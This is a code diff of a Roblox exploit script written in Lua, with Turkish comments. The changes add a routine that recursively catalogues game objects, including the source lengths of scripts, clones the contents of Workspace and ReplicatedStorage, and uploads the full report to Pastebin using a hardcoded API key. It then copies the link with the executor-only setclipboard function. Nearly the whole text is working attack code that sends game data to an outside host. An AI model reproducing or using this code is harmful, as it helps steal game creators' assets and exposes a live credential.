@@ -1,6 +1,7 @@
 -- Hedef servisler
 local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 
 -- Hedef klasörler
 local targets = {
@@ -40,34 +41,77 @@ local function deepClone(obj, parent)
 	end
 end
 
--- Tarama ve kopyalama
-print("[EXPLOIT] Kopyalama başladı...")
+-- Detaylı bilgi toplama fonksiyonu
+local function getObjectInfo(obj, depth)
+	depth = depth or 0
+	local indent = string.rep("  ", depth)
+	local info = ""
+	
+	-- Obje bilgisi
+	info = info .. indent .. "├─ " .. obj.ClassName .. ' "' .. obj.Name .. '"\n'
+	info = info .. indent .. "│  Path: " .. obj:GetFullName() .. "\n"
+	
+	-- Özellikler
+	local props = {}
+	pcall(function()
+		if obj:IsA("BasePart") then
+			table.insert(props, "Position: " .. tostring(obj.Position))
+			table.insert(props, "Size: " .. tostring(obj.Size))
+			table.insert(props, "Color: " .. tostring(obj.Color))
+			table.insert(props, "Material: " .. tostring(obj.Material))
+			table.insert(props, "Transparency: " .. tostring(obj.Transparency))
+			table.insert(props, "Anchored: " .. tostring(obj.Anchored))
+		elseif obj:IsA("Model") then
+			table.insert(props, "PrimaryPart: " .. tostring(obj.PrimaryPart))
+		elseif obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+			table.insert(props, "Source Length: " .. #obj.Source .. " chars")
+			table.insert(props, "Disabled: " .. tostring(obj.Disabled))
+		elseif obj:IsA("Sound") then
+			table.insert(props, "SoundId: " .. obj.SoundId)
+			table.insert(props, "Volume: " .. tostring(obj.Volume))
+			table.insert(props, "Playing: " .. tostring(obj.Playing))
+		elseif obj:IsA("Animation") then
+			table.insert(props, "AnimationId: " .. obj.AnimationId)
+		elseif obj:IsA("Humanoid") then
+			table.insert(props, "Health: " .. tostring(obj.Health))
+			table.insert(props, "MaxHealth: " .. tostring(obj.MaxHealth))
+			table.insert(props, "WalkSpeed: " .. tostring(obj.WalkSpeed))
+		end
+	end)
+	
+	for _, prop in ipairs(props) do
+		info = info .. indent .. "│  " .. prop .. "\n"
+	end
+	
+	-- Alt objeler
+	local children = obj:GetChildren()
+	if #children > 0 then
+		info = info .. indent .. "│  Children: " .. #children .. "\n"
+		for i, child in ipairs(children) do
+			info = info .. getObjectInfo(child, depth + 1)
+		end
+	end
+	
+	return info
+end
 
 -- Pastebin upload fonksiyonu
-local function uploadToPastebin(code)
-	local HttpService = game:GetService("HttpService")
-	local apiKey = "1ddNdzegnNRL9UIrL_p9gbm4Q8er996l"
-	
-	local postData = {
-		api_dev_key = apiKey,
-		api_option = "paste",
-		api_paste_code = code,
-		api_paste_name = "crustsfey",
-		api_paste_format = "lua",
-		api_paste_private = "1", -- unlisted
-		api_paste_expire_date = "1D" -- 1 gün
-	}
+local function uploadToPastebin(code, title)
+	local postData = "api_dev_key=1ddNdzegnNRL9UIrL_p9gbm4Q8er996l"
+	postData = postData .. "&api_option=paste"
+	postData = postData .. "&api_paste_code=" .. HttpService:UrlEncode(code)
+	postData = postData .. "&api_paste_name=" .. HttpService:UrlEncode(title)
+	postData = postData .. "&api_paste_format=lua"
+	postData = postData .. "&api_paste_private=1"
+	postData = postData .. "&api_paste_expire_date=1W"
 	
 	local url = "https://pastebin.com/api/api_post.php"
 	
 	local success, result = pcall(function()
-		return HttpService:PostAsync(url, HttpService:UrlEncode(postData))
+		return HttpService:PostAsync(url, postData, Enum.HttpContentType.ApplicationUrlEncoded)
 	end)
 	
-	if success then
-		print("[PASTEBIN] Link: " .. result)
-		setclipboard(result)
-		print("[PASTEBIN] Link kopyalandı!")
+	if success and result:match("^https://") then
 		return result
 	else
 		warn("[PASTEBIN HATA] " .. tostring(result))
@@ -75,25 +119,66 @@ local function uploadToPastebin(code)
 	end
 end
 
-for i, target in pairs(targets) do
+print("[EXPLOIT] Tarama başladı...")
+
+-- Tüm bilgileri topla
+local fullReport = "=== ROBLOX EXPLOIT - OBJE RAPORU ===\n"
+fullReport = fullReport .. "Tarih: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
+fullReport = fullReport .. "Oyun: " .. game.Name .. "\n\n"
+
+local totalObjects = 0
+
+-- Tarama ve kopyalama
+for _, target in pairs(targets) do
 	if target then
+		fullReport = fullReport .. "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+		fullReport = fullReport .. "HEDEF: " .. target:GetFullName() .. "\n"
+		fullReport = fullReport .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+		
 		local targetCopyFolder = Instance.new("Folder")
 		targetCopyFolder.Name = target.Name .. "_Copy"
 		targetCopyFolder.Parent = exploitFolder
 		
 		local count = 0
 		for _, child in pairs(target:GetChildren()) do
+			-- Bilgi topla
+			fullReport = fullReport .. getObjectInfo(child, 0) .. "\n"
+			
+			-- Kopyala
 			if deepClone(child, targetCopyFolder) then
 				count = count + 1
 			end
 		end
 		
+		totalObjects = totalObjects + count
+		fullReport = fullReport .. "\n[ÖZET] " .. count .. " obje kopyalandı\n"
 		print(string.format("[✓] %s - %d obje kopyalandı", target.Name, count))
 	end
 end
 
--- Script'i string'e çevir ve Pastebin'e yükle
-local fullScript = game:GetObjects("rbxasset://script")[1].Source or ""
-uploadToPastebin(fullScript)
+fullReport = fullReport .. "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+fullReport = fullReport .. "TOPLAM: " .. totalObjects .. " obje Workspace/Exploit'e kopyalandı\n"
+fullReport = fullReport .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+
+print("[EXPLOIT] Pastebin'e yükleniyor...")
+
+-- Pastebin'e yükle
+local pasteLink = uploadToPastebin(fullReport, "Roblox Exploit - Object Report " .. os.date("%Y%m%d"))
+
+if pasteLink then
+	print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+	print("[✓] PASTEBIN LİNKİ:")
+	print(pasteLink)
+	print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+	
+	-- Panoya kopyala
+	if setclipboard then
+		setclipboard(pasteLink)
+		print("[✓] Link panoya kopyalandı!")
+	end
+else
+	warn("[!] Pastebin yüklenemedi, rapor konsola yazdırılıyor:")
+	print(fullReport)
+end
 
 print("[EXPLOIT] İşlem tamamlandı!")
